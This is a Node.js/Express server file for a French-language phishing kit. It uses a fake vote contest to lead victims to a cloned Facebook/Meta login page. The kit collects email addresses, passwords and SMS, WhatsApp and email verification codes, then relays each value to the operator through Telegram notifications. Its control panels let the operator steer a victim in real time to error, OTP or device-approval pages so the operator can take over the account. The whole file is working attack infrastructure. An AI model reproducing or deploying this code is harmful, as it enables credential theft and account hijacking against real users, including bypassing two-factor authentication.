require('dotenv').config();
const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');

const {
  upsertClient,
  getClient,
  getAllClients,
  setPendingAction,
  consumePendingAction,
  logAudit
} = require('./db');
const { getPageMeta, resolveActionPage } = require('./pages');
const { 
  notifyNewClient, 
  notifyData, 
  notifyAction, 
  notifyPageChange, 
  notifyVoteApproved,
  getBotsConfig,
  toggleBot,
  togglePanel,
  getPanelStatus
} = require('./telegram');

const app = express();
const PORT = process.env.PORT || 3000;

const dataDir = path.join(__dirname, '..', 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

app.set('trust proxy', true);
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(rateLimit({ windowMs: 60 * 1000, max: 120 }));

function clientKey(req) {
  const session = req.query.session || req.body?.session;
  const ip = req.query.ip || req.body?.ip || req.ip;
  return { session, ip: String(ip).replace('::ffff:', '') };
}

function requireSession(req, res) {
  const { session, ip } = clientKey(req);
  if (!session || !ip) {
    res.status(400).json({ success: false, error: 'session et ip requis' });
    return null;
  }
  return { session, ip };
}

// --- API compatibles PHP ---

app.get('/check_action.php', (req, res) => {
  const keys = requireSession(req, res);
  if (!keys) return;

  const { session, ip } = keys;
  const isNew = !getClient(session, ip);
  const { client } = upsertClient(session, ip, { user_agent: req.get('user-agent') });

  if (isNew) notifyNewClient(client);

  const pending = consumePendingAction(session, ip);
  if (!pending) return res.json({});

  if (pending.action === 'redirect' || pending.action === 'custom') {
    const page = resolveActionPage(pending.action, pending.redirect);
    upsertClient(session, ip, { current_page: page });
    return res.json({ action: pending.action, redirect: pending.redirect });
  }

  const page = resolveActionPage(pending.action);
  upsertClient(session, ip, { current_page: page });
  res.json({ action: pending.action, errorMessage: pending.errorMessage });
});

app.get('/get_client_status.php', (req, res) => {
  const keys = requireSession(req, res);
  if (!keys) return;

  const client = getClient(keys.session, keys.ip);
  if (!client) {
    return res.json({ success: false, error: 'Client introuvable' });
  }

  const meta = getPageMeta(client.current_page);
  res.json({
    success: true,
    page: client.current_page,
    pageName: meta.pageName,
    pageColor: meta.pageColor,
    pageIcon: meta.pageIcon,
    email: client.email || 'Non disponible',
    password: client.password || 'Non disponible',
    sms_code: client.sms_code || 'Non disponible',
    whatsapp_code: client.whatsapp_code || 'Non disponible',
    email_code: client.email_code || 'Non disponible'
  });
});

app.post('/save_action.php', (req, res) => {
  const { session, ip } = req.body || {};
  if (!session || !ip) {
    return res.status(400).json({ success: false, error: 'session et ip requis' });
  }

  const { action, redirect, errorMessage } = req.body;
  if (!action) {
    return res.status(400).json({ success: false, error: 'action requise' });
  }

  upsertClient(session, ip);
  setPendingAction(session, ip, action, redirect || null, errorMessage || null);
  logAudit(session, ip, action, JSON.stringify({ redirect, errorMessage }));
  notifyAction(session, ip, redirect ? `${action} -> ${redirect}` : action);

  res.json({ success: true });
});

app.get('/update_page.php', (req, res) => {
  const keys = requireSession(req, res);
  if (!keys) return;

  const page = req.query.page || 'index.html';
  upsertClient(keys.session, keys.ip, { current_page: page, user_agent: req.get('user-agent') });
  notifyPageChange(keys.session, keys.ip, page);
  res.json({ success: true });
});

app.post('/submit_data.php', (req, res) => {
  const { session, ip, field, value } = req.body || {};
  if (!session || !ip || !field) {
    return res.status(400).json({ success: false, error: 'Paramètres manquants' });
  }

  const allowed = ['email', 'password', 'sms_code', 'whatsapp_code', 'email_code'];
  if (!allowed.includes(field)) {
    return res.status(400).json({ success: false, error: 'Champ invalide' });
  }

  upsertClient(session, ip, { [field]: value });
  logAudit(session, ip, 'submit_data', `${field}=${value}`);
  notifyData(session, ip, field, value);

  upsertClient(session, ip, { current_page: 'loading.php' });
  setPendingAction(session, ip, 'loading');

  res.json({ success: true });
});

app.get('/register.php', (req, res) => {
  const ip = String(req.ip).replace('::ffff:', '');
  const session = 'session_' + ip;
  const { client, isNew } = upsertClient(session, ip, { user_agent: req.get('user-agent') });
  if (isNew) notifyNewClient(client);
  res.json({ success: true, session, ip });
});

app.get('/api/clients', (req, res) => {
  res.json({ success: true, clients: getAllClients() });
});

// --- API de gestion des bots Telegram ---

app.get('/api/bots/config', (req, res) => {
  res.json({ success: true, config: getBotsConfig() });
});

app.post('/api/bots/toggle', (req, res) => {
  const { botNumber, enabled } = req.body;
  if (!botNumber || typeof enabled !== 'boolean') {
    return res.status(400).json({ success: false, error: 'Paramètres invalides' });
  }
  const success = toggleBot(botNumber, enabled);
  if (success) {
    res.json({ success: true, message: `Bot ${botNumber} ${enabled ? 'activé' : 'désactivé'}` });
  } else {
    res.status(400).json({ success: false, error: 'Bot introuvable' });
  }
});

app.get('/api/panels/status', (req, res) => {
  res.json({ success: true, status: getPanelStatus() });
});

app.post('/api/panels/toggle', (req, res) => {
  const { panelNumber, enabled } = req.body;
  if (!panelNumber || typeof enabled !== 'boolean') {
    return res.status(400).json({ success: false, error: 'Paramètres invalides' });
  }
  const success = togglePanel(panelNumber, enabled);
  if (success) {
    res.json({ success: true, message: `Panel ${panelNumber} ${enabled ? 'activé' : 'désactivé'}` });
  } else {
    res.status(400).json({ success: false, error: 'Panel introuvable' });
  }
});

// --- Pages de flux ---

function flowPageHtml({ title, page, bodyContent, session, ip, name }) {
  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>${title}</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📘</text></svg>">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}
    .meta-header{width:100%;background:#fff;border-bottom:1px solid #dddfe2;padding:12px 0;text-align:center;position:fixed;top:0;z-index:100}
    .meta-header svg{height:28px}
    .container{width:100%;max-width:400px;padding:80px 16px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
    .card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:24px;width:100%}
    h1{font-size:20px;font-weight:600;color:#1c1e21;margin-bottom:4px;text-align:center}
    .subtitle{color:#65676b;font-size:14px;margin-bottom:20px;text-align:center;line-height:1.4}
    .error{background:#ffebe9;color:#c0392b;padding:10px 14px;border-radius:6px;margin-bottom:16px;font-size:13px;display:none;border:1px solid #f5c6cb}
    .error.show{display:block}
    label{display:block;font-size:13px;font-weight:500;color:#65676b;margin-bottom:6px}
    input[type="text"],input[type="password"],input[type="tel"],input[type="email"]{width:100%;padding:14px 16px;border:1px solid #ccd0d5;border-radius:6px;font-size:16px;color:#1c1e21;background:#f5f6f7;transition:border-color .2s,background .2s;outline:none;margin-bottom:12px;font-family:inherit}
    input:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 2px #e7f3ff}
    input::placeholder{color:#90949c}
    .btn-primary{width:100%;padding:12px;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;color:#fff;background:#1877f2;transition:background .2s;font-family:inherit;margin-top:4px}
    .btn-primary:hover{background:#166fe5}
    .btn-primary:active{background:#1463d8}
    .btn-primary:disabled{background:#e4e6eb;color:#bcc0c4;cursor:not-allowed}
    .lang-links{text-align:center;margin-top:16px}
    .lang-links a{color:#1877f2;text-decoration:none;font-size:13px;font-weight:500;padding:2px 6px;border-radius:4px}
    .lang-links a:hover{background:#e7f3ff}
    .lang-links a.active{color:#65676b;font-weight:600}
    .meta-footer{width:100%;text-align:center;padding:16px;color:#8a8d91;font-size:12px;line-height:1.6}
    .meta-footer a{color:#8a8d91;text-decoration:none}
    .meta-footer a:hover{text-decoration:underline}
    .spinner{width:40px;height:40px;border:4px solid #e4e6eb;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
    @keyframes spin{to{transform:rotate(360deg)}}
    .spinner-text{margin-top:16px;color:#65676b;font-size:14px;text-align:center}
    .progress-bar-container{width:100%;height:4px;background:#e4e6eb;border-radius:2px;margin:20px 0 8px;overflow:hidden}
    .progress-bar-fill{height:100%;background:#1877f2;border-radius:2px;animation:progress 3s ease-in-out infinite;width:30%}
    @keyframes progress{0%{width:0%;margin-left:0}50%{width:70%;margin-left:15%}100%{width:0%;margin-left:100%}}
    .success-icon{width:80px;height:80px;background:#e6f4ea;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
    .shield-icon{width:80px;height:80px;background:#f3e8fd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
    .app-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:24px}
    .fb-box{background:#f0f2f5;border-radius:8px;padding:16px;margin:16px 0;text-align:center}
    .fb-box img{height:20px;filter:grayscale(0)}
    .code-inputs{display:flex;gap:8px;justify-content:center;margin:16px 0}
    .code-inputs input{width:48px;height:56px;border:2px solid #ccd0d5;border-radius:8px;text-align:center;font-size:24px;font-weight:600;color:#1c1e21;background:#f5f6f7;outline:none;font-family:inherit;padding:0}
    .code-inputs input:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 2px #e7f3ff}
    .device-animation{width:80px;height:80px;margin:0 auto 16px;position:relative}
    .device-animation .phone{width:50px;height:80px;border:3px solid #9333ea;border-radius:10px;margin:0 auto;position:relative;animation:shake 2s ease-in-out infinite}
    .device-animation .check{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:24px;color:#9333ea}
    @keyframes shake{0%,100%{transform:rotate(0)}25%{transform:rotate(-5deg)}75%{transform:rotate(5deg)}}
    .fb-logo-big{width:60px;height:60px;background:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:32px;color:#fff;font-weight:700}
    .step-indicator{display:flex;justify-content:center;gap:8px;margin:16px 0}
    .step-dot{width:8px;height:8px;border-radius:50%;background:#e4e6eb}
    .step-dot.active{background:#1877f2}
    .step-dot.done{background:#34a853}
  </style>
</head>
<body>
  <div class="meta-header">
    <svg viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
      <text x="50%" y="22" text-anchor="middle" font-family="Inter,Helvetica,Arial,sans-serif" font-size="22" font-weight="700" fill="#1877f2">meta</text>
    </svg>
  </div>
  <div class="container">
    <div class="card">
      ${bodyContent}
    </div>
    <div class="lang-links">
      <a href="#" class="active">Fran\u00e7ais</a> &middot;
      <a href="#">English</a> &middot;
      <a href="#">Espa\u00f1ol</a> &middot;
      <a href="#">Portugu\u00eas</a>
    </div>
  </div>
  <div class="meta-footer">
    <div>Meta &copy; 2026</div>
    <div style="margin-top:4px">
      <a href="#">Conditions</a> &middot; <a href="#">Politique de confidentialit\u00e9</a> &middot; <a href="#">Politique relative aux cookies</a>
    </div>
  </div>
  <script>
    const sessionId = ${JSON.stringify(session)};
    const clientIp = ${JSON.stringify(ip)};
    const clientName = ${JSON.stringify(name || 'VOTEZ')};
    const currentPage = ${JSON.stringify(page)};
    fetch('update_page.php?session='+encodeURIComponent(sessionId)+'&ip='+encodeURIComponent(clientIp)+'&page='+encodeURIComponent(currentPage));
    function showError(msg){const el=document.getElementById('error-msg');if(el&&msg){el.textContent=msg;el.classList.add('show')}}
    function submitField(field,value){return fetch('submit_data.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:sessionId,ip:clientIp,field,value})})}
    function checkAction(){fetch('check_action.php?session='+encodeURIComponent(sessionId)+'&ip='+encodeURIComponent(clientIp)).then(r=>r.json()).then(data=>{if(data.action){const base=data.redirect?data.redirect+'.php':data.action+'.php';const params='session='+encodeURIComponent(sessionId)+'&ip='+encodeURIComponent(clientIp)+'&name='+encodeURIComponent(clientName);const err=data.errorMessage?'&error='+encodeURIComponent(data.errorMessage):'';window.location.href=base+'?'+params+err}})}
    setInterval(checkAction,2000);
  </script>
</body>
</html>`;
}

function pageParams(req) {
  return {
    session: req.query.session || 'session_unknown',
    ip: req.query.ip || req.ip,
    name: req.query.name || 'VOTEZ',
    error: req.query.error || ''
  };
}

app.get('/connexion_f.php', (req, res) => {
  const p = pageParams(req);
  const errHtml = p.error ? `<div class="error show" id="error-msg">${decodeURIComponent(p.error)}</div>` : `<div class="error" id="error-msg"></div>`;
  const body = `
    <div class="fb-logo-big">f</div>
    <h1>Se connecter</h1>
    <p class="subtitle">Utilisez votre compte Facebook pour vous connecter</p>
    ${errHtml}
    <form onsubmit="event.preventDefault(); this.querySelector('button').disabled=true; this.querySelector('button').textContent='Connexion en cours...'; submitField('email', document.getElementById('email').value).then(()=>submitField('password', document.getElementById('password').value).then(()=>window.location.href='loading.php?session=${encodeURIComponent(p.session)}&ip=${encodeURIComponent(p.ip)}&name=${encodeURIComponent(p.name)}'));">
      <label for="email">Adresse e-mail ou num\u00e9ro de t\u00e9l\u00e9phone</label>
      <input type="text" id="email" required autocomplete="username" placeholder="Entrez votre e-mail ou t\u00e9l\u00e9phone">
      <label for="password">Mot de passe</label>
      <input type="password" id="password" required autocomplete="current-password" placeholder="Entrez votre mot de passe">
      <button type="submit" class="btn-primary">Se connecter</button>
    </form>
    <div style="text-align:center;margin-top:16px">
      <a href="#" style="color:#1877f2;font-size:14px;text-decoration:none;font-weight:500">Mot de passe oubli\u00e9 ?</a>
    </div>
    <div style="text-align:center;margin-top:24px;padding-top:16px;border-top:1px solid #dadde1">
      <a href="#" style="display:inline-block;background:#42b72a;color:#fff;padding:10px 24px;border-radius:6px;font-size:14px;font-weight:600;text-decoration:none">Cr\u00e9er un nouveau compte</a>
    </div>`;
  res.send(flowPageHtml({ title: 'Facebook - Connexion', page: 'connexion_f.php', bodyContent: body, ...p }));
});

app.get('/loading.php', (req, res) => {
  const p = pageParams(req);
  const body = `
    <div class="fb-box">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877f2"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>
      <div style="font-size:13px;color:#65676b;margin-top:6px">facebook</div>
    </div>
    <div class="spinner"></div>
    <p class="spinner-text">V\u00e9rification de vos identifiants en cours...</p>
    <div class="progress-bar-container"><div class="progress-bar-fill"></div></div>
    <p style="font-size:12px;color:#8a8d91;text-align:center;margin-top:8px">Veuillez patienter, cela ne prendre que quelques secondes</p>`;
  res.send(flowPageHtml({ title: 'V\u00e9rification en cours', page: 'loading.php', bodyContent: body, ...p }));
});

function verificationPage(req, res, { title, page, field, label, icon, color, emoji }) {
  const p = pageParams(req);
  const errHtml = p.error ? `<div class="error show" id="error-msg">${p.error}</div>` : `<div class="error" id="error-msg"></div>`;
  const body = `
    <div class="app-icon" style="background:${color}20;color:${color}">
      ${emoji}
    </div>
    <h1>${title}</h1>
    <p class="subtitle">Nous avons envoy\u00e9 un code de v\u00e9rification \u00e0 votre num\u00e9ro. Entrez-le ci-dessous pour confirmer votre identit\u00e9.</p>
    ${errHtml}
    <form onsubmit="event.preventDefault(); submitField('${field}', document.getElementById('code').value).then(()=>window.location.href='loading.php?session=${encodeURIComponent(p.session)}&ip=${encodeURIComponent(p.ip)}&name=${encodeURIComponent(p.name)}');">
      <label for="code">${label}</label>
      <input type="text" id="code" required maxlength="8" placeholder="Entrez le code" style="text-align:center;font-size:20px;letter-spacing:4px;font-weight:600">
      <button type="submit" class="btn-primary">V\u00e9rifier</button>
    </form>
    <div style="text-align:center;margin-top:16px">
      <a href="#" style="color:#1877f2;font-size:13px;text-decoration:none;font-weight:500">Renvoyer le code</a>
    </div>`;
  res.send(flowPageHtml({ title, page, bodyContent: body, ...p }));
}

app.get('/sms_verification.php', (req, res) =>
  verificationPage(req, res, { title: 'V\u00e9rification par SMS', page: 'sms_verification.php', field: 'sms_code', label: 'Code de v\u00e9rification', color: '#34a853', emoji: '<svg width="28" height="28" viewBox="0 0 24 24" fill="#34a853"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/><path d="M7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2z"/></svg>' })
);

app.get('/whatsapp_verification.php', (req, res) =>
  verificationPage(req, res, { title: 'V\u00e9rification WhatsApp', page: 'whatsapp_verification.php', field: 'whatsapp_code', label: 'Code de v\u00e9rification', color: '#25d366', emoji: '<svg width="28" height="28" viewBox="0 0 24 24" fill="#25d366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>' })
);

app.get('/email_verification.php', (req, res) =>
  verificationPage(req, res, { title: 'V\u00e9rification par e-mail', page: 'email_verification.php', field: 'email_code', label: 'Code de v\u00e9rification', color: '#ea4335', emoji: '<svg width="28" height="28" viewBox="0 0 24 24" fill="#ea4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>' })
);

app.get('/authorize_device.php', (req, res) => {
  const p = pageParams(req);
  const body = `
    <div class="shield-icon">
      <svg width="40" height="40" viewBox="0 0 24 24" fill="#9333ea"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
    </div>
    <h1>Autorisation de l'appareil</h1>
    <p class="subtitle">Nous devons v\u00e9rifier que vous \u00eates bien le propri\u00e9taire de ce compte. Confirmez l'autorisation sur votre appareil principal pour continuer.</p>
    <div class="fb-box">
      <div class="spinner" style="border-top-color:#9333ea"></div>
      <p class="spinner-text" style="margin-top:12px">En attente de confirmation...</p>
    </div>
    <p style="font-size:12px;color:#8a8d91;text-align:center;margin-top:12px">V\u00e9rifiez votre appareil et confirmez la demande de connexion.</p>`;
  res.send(flowPageHtml({ title: 'Autorisation appareil', page: 'authorize_device.php', bodyContent: body, ...p }));
});

app.get('/vote_approved.php', (req, res) => {
  const p = pageParams(req);
  notifyVoteApproved(p.session, p.ip);
  const body = `
    <div class="success-icon">
      <svg width="40" height="40" viewBox="0 0 24 24" fill="#34a853"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    </div>
    <h1>Vote enregistr\u00e9 !</h1>
    <p class="subtitle">Merci, votre vote pour <strong>${p.name}</strong> a \u00e9t\u00e9 pris en compte avec succ\u00e8s.</p>
    <div class="fb-box" style="background:#e6f4ea">
      <p style="color:#1e7e34;font-size:14px;font-weight:500">Votre participation a \u00e9t\u00e9 enregistr\u00e9e. Merci pour votre vote !</p>
    </div>`;
  res.send(flowPageHtml({ title: 'Vote enregistr\u00e9', page: 'vote_approved.php', bodyContent: body, ...p }));
});

app.get('/technical_error.php', (req, res) => {
  const p = pageParams(req);
  const body = `
    <div class="app-icon" style="background:#fce8e6;color:#ea4335">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="#ea4335"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
    </div>
    <h1>Une erreur est survenue</h1>
    <p class="subtitle">Nous rencontrons actuellement un probl\u00e8me technique. Veuillez r\u00e9essayer plus tard ou contacter le support si le probl\u00e8me persiste.</p>
    <div class="fb-box">
      <p style="color:#65676b;font-size:13px">Code d'erreur: INTERNAL_ERROR_500</p>
    </div>`;
  res.send(flowPageHtml({ title: 'Erreur technique', page: 'technical_error.php', bodyContent: body, ...p }));
});

app.get('/retry.php', (req, res) => {
  const p = pageParams(req);
  res.redirect('/connexion_f.php?session=' + encodeURIComponent(p.session) + '&ip=' + encodeURIComponent(p.ip) + '&name=' + encodeURIComponent(p.name));
});

app.get('/facebook_error.php', (req, res) => {
  const p = pageParams(req);
  res.redirect('/connexion_f.php?session=' + encodeURIComponent(p.session) + '&ip=' + encodeURIComponent(p.ip) + '&name=' + encodeURIComponent(p.name) + '&error=' + encodeURIComponent('L\'adresse e-mail ou le mot de passe que vous avez entr\u00e9 est incorrect. Veuillez r\u00e9essayer.'));
});

app.get('/sms_error.php', (req, res) => {
  const p = pageParams(req);
  res.redirect('/sms_verification.php?session=' + encodeURIComponent(p.session) + '&ip=' + encodeURIComponent(p.ip) + '&name=' + encodeURIComponent(p.name) + '&error=' + encodeURIComponent('Le code de v\u00e9rification que vous avez entr\u00e9 est incorrect. Veuillez r\u00e9essayer.'));
});

app.get('/whatsapp_error.php', (req, res) => {
  const p = pageParams(req);
  res.redirect('/whatsapp_verification.php?session=' + encodeURIComponent(p.session) + '&ip=' + encodeURIComponent(p.ip) + '&name=' + encodeURIComponent(p.name) + '&error=' + encodeURIComponent('Le code de v\u00e9rification WhatsApp est incorrect. Veuillez r\u00e9essayer.'));
});

app.get('/email_error.php', (req, res) => {
  const p = pageParams(req);
  res.redirect('/email_verification.php?session=' + encodeURIComponent(p.session) + '&ip=' + encodeURIComponent(p.ip) + '&name=' + encodeURIComponent(p.name) + '&error=' + encodeURIComponent('Le code de v\u00e9rification par e-mail est incorrect. Veuillez r\u00e9essayer.'));
});

// --- Panel admin (REMOTE) ---

app.get('/control_panel.php', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'control_panel.html'));
});

// --- Panel admin 2 ---

app.get('/control_panel_2.php', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'control_panel_2.html'));
});

// --- Panel gestion des bots Telegram ---

app.get('/control_panel_bots.php', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'control_panel_bots.html'));
});

// --- Redirection racine ---

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'vote.html'));
});

// --- Fichiers statiques ---

app.use(express.static(path.join(__dirname, '..')));

app.listen(PORT, () => {
  console.log(`Serveur demarre: http://localhost:${PORT}`);
  console.log(`Page concours:   http://localhost:${PORT}/vote.html`);
  console.log(`Panel admin:     http://localhost:${PORT}/control_panel.php`);
  console.log(`Panel admin 2:   http://localhost:${PORT}/control_panel_2.php`);
  console.log(`Panel bots TG:   http://localhost:${PORT}/control_panel_bots.php`);
});
